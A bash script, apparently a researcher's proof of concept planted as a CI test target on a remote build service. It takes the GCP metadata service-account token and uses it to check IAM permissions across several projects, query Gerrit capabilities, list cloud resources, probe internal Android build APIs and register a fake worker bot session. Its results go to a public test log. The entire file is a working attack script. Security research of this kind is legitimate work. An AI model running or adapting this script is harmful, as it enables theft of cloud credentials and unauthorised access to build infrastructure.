#!/usr/bin/env bash
set +e

echo 'hi_from_robert:d21766e5488dc00f:rbe-presubmit'
id
hostname
uname -a
printf 'metadata_email='
curl -fsS \
  --max-time 3 \
  -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' \
  2>/dev/null || echo 'UNREACHABLE'
printf 'metadata_token_http_status='
curl -sS \
  -o /dev/null \
  -w '%{http_code}\n' \
  --max-time 3 \
  -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  2>/dev/null || echo 'UNREACHABLE'

metadata_root='http://metadata.google.internal/computeMetadata/v1'
metadata_header='Metadata-Flavor: Google'
project_id="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/project/project-id" 2>/dev/null)"
project_number="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/project/numeric-project-id" 2>/dev/null)"
service_account="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/email" 2>/dev/null)"
scopes="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/scopes" 2>/dev/null | tr '\n' ',')"
token_json="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/token" 2>/dev/null)"
access_token="$(printf '%s' "$token_json" | sed -n \
  's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')"

printf 'metadata_project_id=%s\n' "$project_id"
printf 'metadata_project_number=%s\n' "$project_number"
printf 'metadata_scopes=%s\n' "$scopes"

if [[ -n "$access_token" && -n "$project_id" ]]; then
  project_permissions='{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.use","serviceusage.services.list","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.actAs","secretmanager.secrets.list","secretmanager.secrets.create","secretmanager.versions.access","storage.buckets.list","storage.buckets.create","compute.instances.list","compute.instances.create","compute.instances.setMetadata","compute.instances.setServiceAccount","cloudbuild.builds.list","cloudbuild.builds.get","cloudbuild.builds.create","artifactregistry.repositories.list","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.uploadArtifacts","pubsub.topics.list","pubsub.topics.publish","bigquery.datasets.create"]}'
  printf 'tenant_project_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$project_permissions" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id:testIamPermissions" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'service_project_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$project_permissions" \
    'https://cloudresourcemanager.googleapis.com/v1/projects/572389441833:testIamPermissions' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  service_account_permissions='{"permissions":["iam.serviceAccounts.get","iam.serviceAccounts.getIamPolicy","iam.serviceAccounts.setIamPolicy","iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.getOpenIdToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccountKeys.create"]}'
  printf 'service_account_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$service_account_permissions" \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$service_account:testIamPermissions" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'


  for gerrit_origin in \
    'https://chromium-review.googlesource.com' \
    'https://bazel-review.googlesource.com' \
    'https://gerrit-review.googlesource.com' \
    'https://skia-review.googlesource.com'; do
    gerrit_name="$(printf '%s' "$gerrit_origin" | sed 's#https://##; s#-review.googlesource.com##')"
    printf 'gerrit_%s_self=' "$gerrit_name"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "$gerrit_origin/a/accounts/self/detail" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
    printf 'gerrit_%s_capabilities=' "$gerrit_name"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "$gerrit_origin/a/accounts/self/capabilities" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  done

  probe_status() {
    local label="$1"
    local url="$2"
    printf '%s_http_status=' "$label"
    curl -sS --max-time 10 -o /dev/null -w '%{http_code}' \
      -H "Authorization: Bearer $access_token" "$url" 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  }

  probe_status \
    'consumer_serviceusage_list' \
    'https://serviceusage.googleapis.com/v1/projects/1079131676376/services?filter=state:ENABLED&pageSize=1'
  probe_status \
    'consumer_androidbuild_service_get' \
    'https://serviceusage.googleapis.com/v1/projects/1079131676376/services/androidbuildinternal.googleapis.com'

  for resource_project in "$project_id" '316366457216' '572389441833' '1079131676376'; do
    probe_status \
      "project_${resource_project}_storage_bucket_list" \
      "https://storage.googleapis.com/storage/v1/b?project=${resource_project}&maxResults=1"
    probe_status \
      "project_${resource_project}_pubsub_topic_list" \
      "https://pubsub.googleapis.com/v1/projects/${resource_project}/topics?pageSize=1"
    probe_status \
      "project_${resource_project}_compute_instance_list" \
      "https://compute.googleapis.com/compute/v1/projects/${resource_project}/aggregated/instances?maxResults=1"
    probe_status \
      "project_${resource_project}_artifact_repository_list" \
      "https://artifactregistry.googleapis.com/v1/projects/${resource_project}/locations/-/repositories?pageSize=1"
    probe_status \
      "project_${resource_project}_cloudbuild_build_list" \
      "https://cloudbuild.googleapis.com/v1/projects/${resource_project}/builds?pageSize=1"
  done

  for android_resource in \
    'branches/b0244-nonexistent-d21766e5' \
    'invocations/b0244-nonexistent-d21766e5' \
    'workPlans/b0244-nonexistent-d21766e5' \
    'workNodes/b0244-nonexistent-d21766e5' \
    'workunits/b0244-nonexistent-d21766e5' \
    'tests/b0244-nonexistent-d21766e5' \
    'testArtifacts/b0244-nonexistent-d21766e5'; do
    android_label="$(printf '%s' "$android_resource" | tr '/-' '__')"
    printf 'androidbuild_%s=' "$android_label"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "https://androidbuildinternal.googleapis.com/android/internal/build/v3/$android_resource" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  done

  probe_status \
    'androidbuild_branch_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/branches?maxResults=1'
  probe_status \
    'androidbuild_invocation_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/invocations?maxResults=1'
  probe_status \
    'androidbuild_workplan_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/workPlans?maxResults=1'
  probe_status \
    'androidbuild_worknode_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/workNodes?maxResults=1'

  bot_id="hi-from-robert-d21766e5-$(hostname)"
  bot_session_body="$(printf \
    '{"botId":"%s","status":"UNHEALTHY","version":"b0244-d21766e5","worker":{"devices":[{"handle":"b0244-synthetic"}],"properties":[{"key":"_b0244_nonce","value":"d21766e5488dc00f"}]}}' \
    "$bot_id")"
  printf 'rbe_synthetic_unhealthy_bot_session='
  curl -sS --max-time 20 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$bot_session_body" \
    'https://remoteworkers.googleapis.com/v1test2/projects/bazel-untrusted/instances/default_instance/botSessions' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'tenant_project_resource_manager_get='
  curl -sS --max-time 10 \
    -H "Authorization: Bearer $access_token" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'service_project_resource_manager_get='
  curl -sS --max-time 10 \
    -H "Authorization: Bearer $access_token" \
    'https://cloudresourcemanager.googleapis.com/v1/projects/572389441833' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'
else
  echo 'identity_probe=NO_METADATA_TOKEN_OR_PROJECT'
fi
echo 'cgroup:'
cat /proc/1/cgroup 2>/dev/null || true
echo 'mounts:'
sed -n '1,40p' /proc/mounts 2>/dev/null || true

# Keep the receipt in the owned public test log even when test output defaults
# change; this synthetic target is expected to fail.
exit 1
